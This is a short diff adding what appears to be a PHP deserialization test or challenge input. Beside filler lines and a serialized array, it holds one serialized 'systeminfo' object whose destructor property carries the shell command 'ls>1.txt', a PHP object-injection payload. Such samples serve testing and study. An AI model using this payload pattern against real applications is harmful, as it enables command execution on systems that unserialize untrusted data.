@@ -1,0 +1,5 @@
+trash_data
+trash_data
+trash_data
+O:10:"systeminfo":1:{s:17:"__destruct_action";s:8:"ls>1.txt";}
+a:7:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:2;i:4;i:3;i:5;i:4;i:6;i:4;}
